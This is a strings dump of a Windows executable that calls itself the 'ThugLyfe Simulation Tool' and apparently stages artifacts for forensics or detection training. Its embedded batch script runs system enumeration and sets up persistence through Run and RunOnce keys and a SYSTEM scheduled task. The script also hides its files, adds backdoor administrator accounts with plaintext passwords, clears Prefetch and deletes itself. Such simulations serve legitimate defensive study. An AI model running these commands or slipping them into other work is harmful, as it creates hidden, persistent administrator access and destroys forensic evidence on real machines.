Number	Offset	Address		Size	Type	String
33	000025c1	0000000140002fc1	Section(0)['.text']	05	A	IcP<L
34	00002640	0000000140003040	Section(0)['.text']	05	A	HcH<H
35	00002680	0000000140003080	Section(0)['.text']	05	A	LcB<I
36	00002712	0000000140003112	Section(0)['.text']	05	A	McC<M
37	000027da	00000001400031da	Section(0)['.text']	06	A	L$rH
38	000028a9	00000001400032a9	Section(0)['.text']	05	A	T$XfA
39	00002991	0000000140003391	Section(0)['.text']	06	A	C$9C(~
40	0000299d	000000014000339d	Section(0)['.text']	07	A	 u HcS$
41	000029e0	00000001400033e0	Section(0)['.text']	0d	A	AWAVAUATUWVSH
42	00002a92	0000000140003492	Section(0)['.text']	06	A	C$9C(~
43	00002afd	00000001400034fd	Section(0)['.text']	0d	A	H[^_]A\A]A^A_
44	00002be2	00000001400035e2	Section(0)['.text']	06	A	S$9S(~
45	00002c27	0000000140003627	Section(0)['.text']	06	A	S$9S(~
46	00002db0	00000001400037b0	Section(0)['.text']	0d	A	UAWAVAUATWVSH
47	00002f94	0000000140003994	Section(0)['.text']	0c	A	[^_A\A]A^A_]
48	0000304d	0000000140003a4d	Section(0)['.text']	06	A	C$9C(~
49	000030ad	0000000140003aad	Section(0)['.text']	06	A	C$9C(~
50	00003260	0000000140003c60	Section(0)['.text']	0d	A	UAWAVAUATWVSH
51	00003437	0000000140003e37	Section(0)['.text']	06	A	C$9C(~
52	00003491	0000000140003e91	Section(0)['.text']	06	A	S$9S(~
53	000034bc	0000000140003ebc	Section(0)['.text']	0c	A	[^_A\A]A^A_]
54	000035f0	0000000140003ff0	Section(0)['.text']	07	A	UATWVSH
55	00003619	0000000140004019	Section(0)['.text']	05	A	HcCH
56	00003682	0000000140004082	Section(0)['.text']	06	A	C$9C(~
57	000036b1	00000001400040b1	Section(0)['.text']	06	A	[^_A\]
58	000036d1	00000001400040d1	Section(0)['.text']	06	A	[^_A\]
59	00003740	0000000140004140	Section(0)['.text']	05	A	UWVSH
60	00003853	0000000140004253	Section(0)['.text']	06	A	=UUUUw
61	0000388a	000000014000428a	Section(0)['.text']	05	A	([^_]
62	00003913	0000000140004313	Section(0)['.text']	05	A	([^_]
63	00003b41	0000000140004541	Section(0)['.text']	05	A	gfffH
64	00003b5d	000000014000455d	Section(0)['.text']	05	A	gfffH
65	00003d29	0000000140004729	Section(0)['.text']	06	A	S$9S(~
66	00003ef0	00000001400048f0	Section(0)['.text']	09	A	AUATUWVSH
67	0000401f	0000000140004a1f	Section(0)['.text']	05	A	D$0.H
68	000040ac	0000000140004aac	Section(0)['.text']	05	A	l$.H9
69	000041cd	0000000140004bcd	Section(0)['.text']	05	A	gfffH
70	00004297	0000000140004c97	Section(0)['.text']	09	A	X[^_]A\A]
71	00004390	0000000140004d90	Section(0)['.text']	0d	A	AWAVAUATUWVSH
72	00004468	0000000140004e68	Section(0)['.text']	05	A	 umHc
73	00004550	0000000140004f50	Section(0)['.text']	0c	A	[^_]A\A]A^A_
74	000048d6	00000001400052d6	Section(0)['.text']	05	A	L$x@H
75	00004f50	0000000140005950	Section(0)['.text']	0d	A	AWAVAUATUWVSH
76	00005067	0000000140005a67	Section(0)['.text']	0d	A	8[^_]A\A]A^A_
77	000050d0	0000000140005ad0	Section(0)['.text']	0d	A	AWAVAUATUWVSH
78	00005363	0000000140005d63	Section(0)['.text']	05	A	T$pf.
79	000053bb	0000000140005dbb	Section(0)['.text']	0c	A	[^_]A\A]A^A_
80	00005407	0000000140005e07	Section(0)['.text']	0c	A	[^_]A\A]A^A_
81	000054b4	0000000140005eb4	Section(0)['.text']	05	A	D)\$p
82	000054bd	0000000140005ebd	Section(0)['.text']	05	A	\$xE1
83	0000556d	0000000140005f6d	Section(0)['.text']	05	A	D$Xt(
84	00005627	0000000140006027	Section(0)['.text']	05	A	l$PE1
85	00005899	0000000140006299	Section(0)['.text']	07	A	D$xA;E
86	000058ad	00000001400062ad	Section(0)['.text']	05	A	HcD$x
87	000059dc	00000001400063dc	Section(0)['.text']	05	A	|$`E)
88	00005a8f	000000014000648f	Section(0)['.text']	05	A	)D$p)
89	00005b1a	000000014000651a	Section(0)['.text']	05	A	D$\A)
90	00005f58	0000000140006958	Section(0)['.text']	05	A	D$xE1
91	00006530	0000000140006f30	Section(0)['.text']	05	A	HcEL
92	000068b0	00000001400072b0	Section(0)['.text']	0a	A	ATUWVSHcY
93	000068d6	00000001400072d6	Section(0)['.text']	06	A	[^_]A\
94	00006988	0000000140007388	Section(0)['.text']	06	A	[^_]A\
95	000069b0	00000001400073b0	Section(0)['.text']	05	A	HcQH
96	00006a94	0000000140007494	Section(0)['.text']	05	A	 [^_H
97	00006c80	0000000140007680	Section(0)['.text']	05	A	UWVSH
98	00006ce1	00000001400076e1	Section(0)['.text']	05	A	([^_]
99	00006d07	0000000140007707	Section(0)['.text']	05	A	HcCH
100	00006e00	0000000140007800	Section(0)['.text']	0d	A	AWAVAUATUWVSH
101	00006e0f	000000014000780f	Section(0)['.text']	0a	A	(LcaHcjI
102	00006f49	0000000140007949	Section(0)['.text']	0d	A	([^_]A\A]A^A_
103	00006f60	0000000140007960	Section(0)['.text']	05	A	UWVSH
104	00006fd8	00000001400079d8	Section(0)['.text']	05	A	([^_]
105	000070e0	0000000140007ae0	Section(0)['.text']	0b	A	AVAUATUWVSH
106	00007147	0000000140007b47	Section(0)['.text']	06	A	IcD$I
107	00007196	0000000140007b96	Section(0)['.text']	05	A	L$L)
108	000071d4	0000000140007bd4	Section(0)['.text']	0b	A	 [^_]A\A]A^
109	000071f0	0000000140007bf0	Section(0)['.text']	05	A	HcBD
110	00007240	0000000140007c40	Section(0)['.text']	0b	A	AVAUATUWVSH
111	0000724d	0000000140007c4d	Section(0)['.text']	05	A	 HcB
112	00007293	0000000140007c93	Section(0)['.text']	05	A	2D90t
113	000072b7	0000000140007cb7	Section(0)['.text']	05	A	HcFL
114	000072d2	0000000140007cd2	Section(0)['.text']	05	A	HcCH
115	000073a9	0000000140007da9	Section(0)['.text']	0b	A	 [^_]A\A]A^
116	00007420	0000000140007e20	Section(0)['.text']	08	A	WVSHcAL
117	000078d0	00000001400082d0	Section(0)['.text']	0b	A	AVAUATUWVSH
118	0000794f	000000014000834f	Section(0)['.text']	0b	A	0[^_]A\A]A^
119	00007b30	0000000140008530	Section(0)['.text']	07	A	ATUWVSH
120	00007b90	0000000140008590	Section(0)['.text']	07	A	@[^_]A\
121	00007ba0	00000001400085a0	Section(0)['.text']	0b	A	AVAUATUWVSH
122	00007c26	0000000140008626	Section(0)['.text']	05	A	d$ M)
123	00007c4b	000000014000864b	Section(0)['.text']	0b	A	@[^_]A\A]A^
124	00007c67	0000000140008667	Section(0)['.text']	05	A	|$>E1
125	00007cb0	00000001400086b0	Section(0)['.text']	05	A	UWVSH
126	00007d02	0000000140008702	Section(0)['.text']	05	A	H[^_]
127	00008400	000000014000a000	Section(2)['.rdata']	07	A	[%s] %s
128	00008410	000000014000a010	Section(2)['.rdata']	28	A	========================================
129	0000843a	000000014000a03a	Section(2)['.rdata']	1a	A	  ThugLyfe Simulation Tool
130	00008458	000000014000a058	Section(2)['.rdata']	11	A	%Y-%m-%d %H:%M:%S
131	0000846a	000000014000a06a	Section(2)['.rdata']	1d	A	C:\ProgramData\SecurityUpdate
132	00008490	000000014000a090	Section(2)['.rdata']	28	A	C:\ProgramData\SecurityUpdate\update.log
133	000084b9	000000014000a0b9	Section(2)['.rdata']	15	A	SecurityAdvisory.docm
134	000084d2	000000014000a0d2	Section(2)['.rdata']	0d	A	cmd.exe /c %s
135	000084e0	000000014000a0e0	Section(2)['.rdata']	09	A	data1.bin
136	000084ea	000000014000a0ea	Section(2)['.rdata']	05	A	%s\%s
137	000084f0	000000014000a0f0	Section(2)['.rdata']	2f	A	C:\Users\IEUser\Documents\SecurityAdvisory.docm
138	00008520	000000014000a120	Section(2)['.rdata']	14	A	image_downloader.exe
139	00008538	000000014000a138	Section(2)['.rdata']	24	A	C:\Windows\Temp\image_downloader.exe
140	0000855d	000000014000a15d	Section(2)['.rdata']	0c	A	fileview.exe
141	0000856a	000000014000a16a	Section(2)['.rdata']	1c	A	C:\Windows\Temp\fileview.exe
142	00008587	000000014000a187	Section(2)['.rdata']	0d	A	frontpage.jpg
143	00008598	000000014000a198	Section(2)['.rdata']	26	A	C:\Users\Public\Pictures\frontpage.jpg
144	000085bf	000000014000a1bf	Section(2)['.rdata']	18	A	C:\ProgramData\asefa.bat
145	000085d8	000000014000a1d8	Section(2)['.rdata']	09	A	@echo off
146	000085e2	000000014000a1e2	Section(2)['.rdata']	32	A	REM Thug Lyfe - System Enumeration and Persistence
147	00008615	000000014000a215	Section(2)['.rdata']	43	A	REM This script performs reconnaissance and establishes persistence
148	0000865a	000000014000a25a	Section(2)['.rdata']	27	A	echo [*] Starting system enumeration...
149	00008683	000000014000a283	Section(2)['.rdata']	1e	A	REM === SYSTEM ENUMERATION ===
150	000086a2	000000014000a2a2	Section(2)['.rdata']	28	A	echo [+] Gathering system information...
151	000086cb	000000014000a2cb	Section(2)['.rdata']	2c	A	systeminfo > C:\ProgramData\sysinfo.txt 2>&1
152	000086f9	000000014000a2f9	Section(2)['.rdata']	2d	A	echo [+] Enumerating network configuration...
153	00008727	000000014000a327	Section(2)['.rdata']	31	A	ipconfig /all > C:\ProgramData\netconfig.txt 2>&1
154	0000875a	000000014000a35a	Section(2)['.rdata']	27	A	echo [+] Listing network connections...
155	00008782	000000014000a382	Section(2)['.rdata']	2e	A	netstat -ano > C:\ProgramData\netstat.txt 2>&1
156	000087b2	000000014000a3b2	Section(2)['.rdata']	25	A	echo [+] Enumerating user accounts...
157	000087d8	000000014000a3d8	Section(2)['.rdata']	28	A	net user > C:\ProgramData\users.txt 2>&1
158	00008801	000000014000a401	Section(2)['.rdata']	3e	A	net localgroup administrators > C:\ProgramData\admins.txt 2>&1
159	00008841	000000014000a441	Section(2)['.rdata']	26	A	echo [+] Checking running processes...
160	00008868	000000014000a468	Section(2)['.rdata']	2f	A	tasklist /v > C:\ProgramData\processes.txt 2>&1
161	00008899	000000014000a499	Section(2)['.rdata']	27	A	echo [+] Enumerating scheduled tasks...
162	000088c1	000000014000a4c1	Section(2)['.rdata']	3b	A	schtasks /query /fo LIST /v > C:\ProgramData\tasks.txt 2>&1
163	000088fe	000000014000a4fe	Section(2)['.rdata']	26	A	echo [+] Listing installed software...
164	00008925	000000014000a525	Section(2)['.rdata']	40	A	wmic product get name,version > C:\ProgramData\software.txt 2>&1
165	00008967	000000014000a567	Section(2)['.rdata']	25	A	echo [+] Checking startup programs...
166	0000898d	000000014000a58d	Section(2)['.rdata']	42	A	wmic startup get caption,command > C:\ProgramData\startup.txt 2>&1
167	000089d1	000000014000a5d1	Section(2)['.rdata']	21	A	REM === PERSISTENCE MECHANISM ===
168	000089f3	000000014000a5f3	Section(2)['.rdata']	24	A	echo [+] Establishing persistence...
169	00008a19	000000014000a619	Section(2)['.rdata']	36	A	REM Copy image_downloader.exe to a persistent location
170	00008a50	000000014000a650	Section(2)['.rdata']	31	A	if exist "C:\Windows\Temp\image_downloader.exe" (
171	00008a82	000000014000a682	Section(2)['.rdata']	68	A	    copy /Y "C:\Windows\Temp\image_downloader.exe" "C:\ProgramData\SecurityUpdate\updater.exe" >nul 2>&1
172	00008aeb	000000014000a6eb	Section(2)['.rdata']	32	A	    echo [*] Payload copied to persistent location
173	00008b21	000000014000a721	Section(2)['.rdata']	2b	A	REM Create registry run key for persistence
174	00008b4d	000000014000a74d	Section(2)['.rdata']	29	A	echo [+] Creating registry persistence...
175	00008b77	000000014000a777	Section(2)['.rdata']	97	A	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityUpdater" /t REG_SZ /d "C:\ProgramData\SecurityUpdate\updater.exe" /f >nul 2>&1
176	00008c10	000000014000a810	Section(2)['.rdata']	27	A	REM Alternative persistence via RunOnce
177	00008c38	000000014000a838	Section(2)['.rdata']	97	A	reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "SystemCheck" /t REG_SZ /d "C:\ProgramData\SecurityUpdate\updater.exe" /f >nul 2>&1
178	00008cd1	000000014000a8d1	Section(2)['.rdata']	29	A	REM Create scheduled task for persistence
179	00008cfb	000000014000a8fb	Section(2)['.rdata']	23	A	echo [+] Creating scheduled task...
180	00008d1f	000000014000a91f	Section(2)['.rdata']	7d	A	schtasks /create /tn "SecurityUpdateTask" /tr "C:\ProgramData\SecurityUpdate\updater.exe" /sc onlogon /ru SYSTEM /f >nul 2>&1
181	00008d9e	000000014000a99e	Section(2)['.rdata']	2e	A	echo [*] Enumeration and persistence complete!
182	00008dcd	000000014000a9cd	Section(2)['.rdata']	29	A	echo [*] Results saved to C:\ProgramData\
183	00008df8	000000014000a9f8	Section(2)['.rdata']	15	A	REM Hide the evidence
184	00008e0e	000000014000aa0e	Section(2)['.rdata']	31	A	attrib +h +s C:\ProgramData\sysinfo.txt >nul 2>&1
185	00008e40	000000014000aa40	Section(2)['.rdata']	33	A	attrib +h +s C:\ProgramData\netconfig.txt >nul 2>&1
186	00008e74	000000014000aa74	Section(2)['.rdata']	31	A	attrib +h +s C:\ProgramData\netstat.txt >nul 2>&1
187	00008ea6	000000014000aaa6	Section(2)['.rdata']	2f	A	attrib +h +s C:\ProgramData\users.txt >nul 2>&1
188	00008ed6	000000014000aad6	Section(2)['.rdata']	30	A	attrib +h +s C:\ProgramData\admins.txt >nul 2>&1
189	00008f07	000000014000ab07	Section(2)['.rdata']	33	A	attrib +h +s C:\ProgramData\processes.txt >nul 2>&1
190	00008f3b	000000014000ab3b	Section(2)['.rdata']	2f	A	attrib +h +s C:\ProgramData\tasks.txt >nul 2>&1
191	00008f6b	000000014000ab6b	Section(2)['.rdata']	32	A	attrib +h +s C:\ProgramData\software.txt >nul 2>&1
192	00008f9e	000000014000ab9e	Section(2)['.rdata']	31	A	attrib +h +s C:\ProgramData\startup.txt >nul 2>&1
193	00008fd0	000000014000abd0	Section(2)['.rdata']	34	A	attrib +h +s C:\ProgramData\SecurityUpdate >nul 2>&1
194	00009006	000000014000ac06	Section(2)['.rdata']	22	A	echo [+] Creating user accounts...
195	0000902a	000000014000ac2a	Section(2)['.rdata']	3a	A	REM Create Adminstrator account (intentionally misspelled)
196	00009065	000000014000ac65	Section(2)['.rdata']	31	A	net user Adminstrator P@ssw0rd123! /add >nul 2>&1
197	00009097	000000014000ac97	Section(2)['.rdata']	39	A	net localgroup Administrators Adminstrator /add >nul 2>&1
198	000090d2	000000014000acd2	Section(2)['.rdata']	1a	A	REM Create SUPPORT account
199	000090ed	000000014000aced	Section(2)['.rdata']	34	A	net user SUPPORT_2734272 Supp0rt#2024 /add >nul 2>&1
200	00009122	000000014000ad22	Section(2)['.rdata']	3c	A	net localgroup Administrators SUPPORT_2734272 /add >nul 2>&1
201	00009160	000000014000ad60	Section(2)['.rdata']	1e	A	echo [*] User accounts created
202	00009180	000000014000ad80	Section(2)['.rdata']	1a	A	REM === CLEAR PREFETCH ===
203	0000919b	000000014000ad9b	Section(2)['.rdata']	22	A	echo [+] Clearing prefetch data...
204	000091be	000000014000adbe	Section(2)['.rdata']	2c	A	del /F /Q C:\Windows\Prefetch\*.pf >nul 2>&1
205	000091eb	000000014000adeb	Section(2)['.rdata']	19	A	echo [*] Prefetch cleared
206	00009206	000000014000ae06	Section(2)['.rdata']	36	A	REM === DELETE THIS BATCH FILE (MUST BE LAST STEP) ===
207	0000923d	000000014000ae3d	Section(2)['.rdata']	1f	A	echo [+] Removing batch file...
208	0000925d	000000014000ae5d	Section(2)['.rdata']	2c	A	del /F /Q C:\ProgramData\asefa.bat >nul 2>&1
209	0000928b	000000014000ae8b	Section(2)['.rdata']	09	A	exit /b 0
210	00009298	000000014000ae98	Section(2)['.rdata']	29	A	C:\ProgramData\SecurityUpdate\updater.exe
211	000092c2	000000014000aec2	Section(2)['.rdata']	1a	A	C:\ProgramData\sysinfo.txt
212	000092dd	000000014000aedd	Section(2)['.rdata']	1c	A	C:\ProgramData\netconfig.txt
213	000092fa	000000014000aefa	Section(2)['.rdata']	1a	A	C:\ProgramData\netstat.txt
214	00009315	000000014000af15	Section(2)['.rdata']	18	A	C:\ProgramData\users.txt
215	0000932e	000000014000af2e	Section(2)['.rdata']	19	A	C:\ProgramData\admins.txt
216	00009348	000000014000af48	Section(2)['.rdata']	1c	A	C:\ProgramData\processes.txt
217	00009365	000000014000af65	Section(2)['.rdata']	18	A	C:\ProgramData\tasks.txt
218	0000937e	000000014000af7e	Section(2)['.rdata']	1b	A	C:\ProgramData\software.txt
219	0000939a	000000014000af9a	Section(2)['.rdata']	1a	A	C:\ProgramData\startup.txt
220	000093b8	000000014000afb8	Section(2)['.rdata']	2d	A	Software\Microsoft\Windows\CurrentVersion\Run
221	000093e6	000000014000afe6	Section(2)['.rdata']	0f	A	SecurityUpdater
222	000093f8	000000014000aff8	Section(2)['.rdata']	31	A	Software\Microsoft\Windows\CurrentVersion\RunOnce
223	0000942a	000000014000b02a	Section(2)['.rdata']	0b	A	SystemCheck
224	00009436	000000014000b036	Section(2)['.rdata']	18	A	ThugLyfe simulation tool
225	00009450	000000014000b050	Section(2)['.rdata']	1c	A	Version 2.1.0 - October 2025
226	00009470	000000014000b070	Section(2)['.rdata']	2e	A	This tool will setup the ThugLyfe environment.
227	000094a0	000000014000b0a0	Section(2)['.rdata']	37	A	Please wait while the environment is being processed...
228	000094e0	000000014000b0e0	Section(2)['.rdata']	22	A	ThugLyfe environment setup started
229	00009508	000000014000b108	Section(2)['.rdata']	31	A	ThugLyfe environment setup completed successfully
230	00009545	000000014000b145	Section(2)['.rdata']	25	A	] All artifacts successfully deployed
231	00009571	000000014000b171	Section(2)['.rdata']	20	A	[!] Artifact verification failed
232	00009598	000000014000b198	Section(2)['.rdata']	21	A	ThugLyfe environment setup failed
233	000095bb	000000014000b1bb	Section(2)['.rdata']	15	A	[!] Deployment failed
234	000095d3	000000014000b1d3	Section(2)['.rdata']	18	A	Press any key to exit...
235	000095ed	000000014000b1ed	Section(2)['.rdata']	09	A	data2.bin
236	000095f7	000000014000b1f7	Section(2)['.rdata']	09	A	data3.bin
237	00009601	000000014000b201	Section(2)['.rdata']	09	A	data4.bin
238	000096e0	000000014000b2e0	Section(2)['.rdata']	1e	A	Argument domain error (DOMAIN)
239	000096ff	000000014000b2ff	Section(2)['.rdata']	1b	A	Argument singularity (SIGN)
240	00009720	000000014000b320	Section(2)['.rdata']	1f	A	Overflow range error (OVERFLOW)
241	00009740	000000014000b340	Section(2)['.rdata']	24	A	Partial loss of significance (PLOSS)
242	00009768	000000014000b368	Section(2)['.rdata']	22	A	Total loss of significance (TLOSS)
243	00009790	000000014000b390	Section(2)['.rdata']	35	A	The result is too small to be represented (UNDERFLOW)
244	000097c6	000000014000b3c6	Section(2)['.rdata']	0d	A	Unknown error
245	000097d8	000000014000b3d8	Section(2)['.rdata']	29	A	_matherr(): %s in %s(%g, %g)  (retval=%g)
246	00009820	000000014000b420	Section(2)['.rdata']	1a	A	Mingw-w64 runtime failure:
247	00009840	000000014000b440	Section(2)['.rdata']	1f	A	Address %p has no image-section
248	00009860	000000014000b460	Section(2)['.rdata']	30	A	  VirtualQuery failed for %d bytes at address %p
249	00009898	000000014000b498	Section(2)['.rdata']	26	A	  VirtualProtect failed with code 0x%x
250	000098c0	000000014000b4c0	Section(2)['.rdata']	30	A	  Unknown pseudo relocation protocol version %d.
251	000098f8	000000014000b4f8	Section(2)['.rdata']	28	A	  Unknown pseudo relocation bit size %d.
252	00009928	000000014000b528	Section(2)['.rdata']	51	A	%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p.
253	000099b0	000000014000b5b0	Section(2)['.rdata']	06	A	(null)
254	000099b8	000000014000b5b8	Section(2)['.rdata']	06	U	(null)
255	00009b40	000000014000b740	Section(2)['.rdata']	08	A	Infinity
256	00009b57	000000014000b757	Section(2)['.rdata']	05	A	?aCoc
257	00009b77	000000014000b777	Section(2)['.rdata']	05	A	<2ZGU
258	00009d15	000000014000b915	Section(2)['.rdata']	06	A	O8M20
259	00009f10	000000014000bb10	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
260	00009f30	000000014000bb30	Section(2)['.rdata']	13	A	GCC: (GNU) 12-win32
261	00009f50	000000014000bb50	Section(2)['.rdata']	13	A	GCC: (GNU) 12-win32
262	00009f70	000000014000bb70	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
263	00009f90	000000014000bb90	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
264	00009fb0	000000014000bbb0	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
265	00009fd0	000000014000bbd0	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
266	00009ff0	000000014000bbf0	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
267	0000a010	000000014000bc10	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
268	0000a030	000000014000bc30	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
269	0000a050	000000014000bc50	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
270	0000a070	000000014000bc70	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
271	0000a090	000000014000bc90	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
272	0000a0b0	000000014000bcb0	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
273	0000a0d0	000000014000bcd0	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
274	0000a0f0	000000014000bcf0	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
275	0000a110	000000014000bd10	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
276	0000a130	000000014000bd30	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
277	0000a150	000000014000bd50	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
278	0000a170	000000014000bd70	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
279	0000a190	000000014000bd90	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
280	0000a1b0	000000014000bdb0	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
281	0000a1d0	000000014000bdd0	Section(2)['.rdata']	13	A	GCC: (GNU) 12-win32
282	0000a1f0	000000014000bdf0	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
283	0000a210	000000014000be10	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
284	0000a230	000000014000be30	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
285	0000a250	000000014000be50	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
286	0000a270	000000014000be70	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
287	0000a290	000000014000be90	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
288	0000a2b0	000000014000beb0	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
289	0000a2d0	000000014000bed0	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
290	0000a2f0	000000014000bef0	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
291	0000a310	000000014000bf10	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
292	0000a330	000000014000bf30	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
293	0000a350	000000014000bf50	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
294	0000a370	000000014000bf70	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
295	0000a390	000000014000bf90	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
296	0000a3b0	000000014000bfb0	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
297	0000a3d0	000000014000bfd0	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
298	0000a3f0	000000014000bff0	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
299	0000a410	000000014000c010	Section(2)['.rdata']	16	A	GCC: (GNU) 12 20220819
300	0000a430	000000014000c030	Section(2)['.rdata']	13	A	GCC: (GNU) 12-win32
301	0000b702	0000000140010502	Section(6)['.idata']	0b	A	RegCloseKey
302	0000b710	0000000140010510	Section(6)['.idata']	0d	A	RegOpenKeyExA
303	0000b720	0000000140010520	Section(6)['.idata']	10	A	RegQueryValueExA
304	0000b734	0000000140010534	Section(6)['.idata']	0b	A	CloseHandle
305	0000b742	0000000140010542	Section(6)['.idata']	09	A	CopyFileA
306	0000b74e	000000014001054e	Section(6)['.idata']	10	A	CreateDirectoryA
307	0000b762	0000000140010562	Section(6)['.idata']	0e	A	CreateProcessA
308	0000b774	0000000140010574	Section(6)['.idata']	15	A	DeleteCriticalSection
309	0000b78c	000000014001058c	Section(6)['.idata']	14	A	EnterCriticalSection
310	0000b7a4	00000001400105a4	Section(6)['.idata']	12	A	GetFileAttributesA
311	0000b7ba	00000001400105ba	Section(6)['.idata']	0c	A	GetLastError
312	0000b7ca	00000001400105ca	Section(6)['.idata']	12	A	GetModuleFileNameA
313	0000b7e0	00000001400105e0	Section(6)['.idata']	0f	A	GetStartupInfoA
314	0000b7f2	00000001400105f2	Section(6)['.idata']	0c	A	GetStdHandle
315	0000b802	0000000140010602	Section(6)['.idata']	19	A	InitializeCriticalSection
316	0000b81e	000000014001061e	Section(6)['.idata']	10	A	IsDBCSLeadByteEx
317	0000b832	0000000140010632	Section(6)['.idata']	14	A	LeaveCriticalSection
